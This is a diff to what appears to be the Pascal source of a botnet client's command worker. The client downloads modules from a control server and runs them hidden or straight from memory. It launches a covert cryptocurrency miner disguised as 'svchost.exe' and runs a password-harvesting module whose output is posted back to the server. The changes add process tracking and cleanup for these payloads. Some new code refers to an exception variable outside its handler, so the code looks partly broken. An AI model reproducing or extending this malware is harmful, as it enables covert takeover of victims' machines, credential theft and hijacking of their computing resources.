@@ -17,7 +17,7 @@ type
     FCmdID: String;
     FIndex: LongInt;
     procedure DownloadFile(URL: String; var MS: TMemoryStream);
-    function ExecuteModule(URL, Params: String; Drop: Boolean = False): Boolean;
+    function ExecuteModule(URL, Params: String; Drop: Boolean = False): Cardinal;
   public
     property Identifier: String read FCmdID write FCmdID;
     constructor Create(CmdID: String; Index: LongInt);
@@ -48,12 +48,11 @@ Begin
   MS.Position:=0;
 end;
 
-function TCmdWorker.ExecuteModule(URL, Params: String; Drop: Boolean = False): Boolean;
+function TCmdWorker.ExecuteModule(URL, Params: String; Drop: Boolean = False): Cardinal;
 var
   MS: TMemoryStream;
   M:  TProcess;
 Begin
-  Result:=True;
   MS:=TMemoryStream.Create;
   try
     DownloadFile(URL, MS);
@@ -68,15 +67,16 @@ Begin
           M.Parameters.Add(Params);
           M.ShowWindow:=swoHIDE;
           M.Execute;
+          Result:=M.ProcessID;
         except
-          on E: Exception do Result:=False;
+          on E: Exception do Result:=0;
         end;
         M.Free;
-      end else Result:=False;
+      end else Result:=0;
     end else
-      Result:=(ExecFromMem(FullName, Params, MS.Memory)<>0);
+      Result:=ExecFromMem(FullName, Params, MS.Memory);
   except
-    on E: Exception do Result:=False;
+    on E: Exception do Result:=0;
   end;
   MS.Free;
 end;
@@ -156,6 +156,8 @@ var
   FFile: Text;
   Error: Boolean = False;
 
+  ModID: Cardinal;
+
   MemDLLData: Pointer;
   MemDLLModule: PBTMemoryModule;
 
@@ -200,6 +202,7 @@ Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result', 'Restarting.');
       DoPost;
+      //We should kill the child processes here...
       AllowExecution:=False;
       Restart(FullName);
     end;
@@ -283,6 +286,14 @@ Begin
             Master.ShowWindow:=swoHIDE;
             Master.InheritHandles:=False;
             Master.Execute;
+            ToPost.AddFormField('Result', 'Execution successful.');
+            ToPost.AddFormField('Continue', 'True');
+            DoPost;
+            While Not(Terminated) do Begin
+              Sleep(100);
+            end;
+            Master.Terminate(0);
+            ToPost.AddFormField('RT', '1');
           except
             on E: Exception do Begin
               Error:=True;
@@ -290,10 +301,11 @@ Begin
             end;
           end;
           Master.Free;
-          if Not(Error) then ToPost.AddFormField('Result', 'Execution successful.');
+          if Not(Error) then ToPost.AddFormField('Result', 'Execution completed.');
         end else ToPost.AddFormField('Result', 'The dropped file doesn''t exist!');
       end;
       DoPost;
+      ChDel('Drop.exe');
     end;
     'MemExec': Begin
       ToPost.AddFormField('RT', '1');
@@ -309,8 +321,17 @@ Begin
         end;
       end;
       if Not(Error) then Begin
-        if(ExecFromMem(FullName, '', MemStream.Memory)<>0) then
-        ToPost.AddFormField('Result', 'Execution successful.')
+        ModID:=ExecFromMem(FullName, '', MemStream.Memory);
+        if ModID>0 then Begin
+          ToPost.AddFormField('Result', 'Execution successful.');
+          ToPost.AddFormField('Continue', 'True');
+          DoPost;
+          While Not(Terminated) do Begin
+            Sleep(100);
+          end;
+          ToPost.AddFormField('RT', '1');
+          ToPost.AddFormField('Result', 'Execution completed.');
+        end
         else ToPost.AddFormField('Result', 'Execution failed!');
       End;
       MemStream.Free;
@@ -333,9 +354,19 @@ Begin
         MemDLLData:=GetMemory(MemStream.Size);
         MemStream.Read(MemDLLData^, MemStream.Size);
         MemDLLModule:=BTMemoryModule.BTMemoryLoadLibary(MemDLLData, MemStream.Size);
-        if MemDLLModule<>Nil then
-        ToPost.AddFormField('Result', 'Execution successful.')
-        else ToPost.AddFormField('Result', 'Failed to load the DLL into memory!');
+        if MemDLLModule<>Nil then Begin
+          ToPost.AddFormField('Result', 'Execution successful.');
+          ToPost.AddFormField('Continue', 'True');
+          DoPost;
+          While Not(Terminated) do Begin
+            Sleep(100);
+          end;
+          BTMemoryModule.BTMemoryFreeLibrary(MemDLLModule);
+          ToPost.AddFormField('RT', '1');
+          ToPost.AddFormField('Result', 'Module freed!');
+        end
+        else ToPost.AddFormField('Result', 'Failed to load the DLL into memory: '+
+        BTMemoryModule.BTMemoryGetLastError);
       end;
       MemStream.Free;
       DoPost;
@@ -381,20 +412,34 @@ Begin
         else
           STemp += MineModule;
         //Start mining
-        if ExecuteModule(STemp, '', True) then
-          ToPost.AddFormField('Result', '['+STemp2+'] started mining!')
-        else
-          ToPost.AddFormField('Result', 'Failed to start the mining process.');
+        ModID:=ExecuteModule(STemp, '', True);
+        if ModID>0 then Begin
+          ToPost.AddFormField('Result', '['+STemp2+'] started mining!');
+          ToPost.AddFormField('Continue', 'True');
+          DoPost;
+          While Not(Terminated) do Begin
+            Sleep(100);
+          end;
+          TerminateProcessByID(ModID);
+          ToPost.AddFormField('RT', '1');
+          ToPost.AddFormField('Result', '['+STemp2+'] stopped mining!');
+        end
+        else Begin
+          ToPost.AddFormField('Result', 'Failed to start the mining process: '+
+          E.Message);
+        end;
       except
         on E: Exception do
           ToPost.AddFormField('Result', 'Mining exception: '+E.Message);
       end;
+      ChDel('svchost.exe');
       DoPost;
     end;
     'Passwords': Begin
       Error:=True; //Not feeling too positive today
-      if ExecuteModule(Server+PassModule, '/shtml P.html') then Begin
-        Sleep(2000);
+      ModID:=ExecuteModule(Server+PassModule, '/shtml P.html');
+      if ModID>0 then Begin
+        Sleep(3000);
         if FileExists('P.html') then Begin
           Error:=False;
           ToPost.AddFormField('RT', '2');
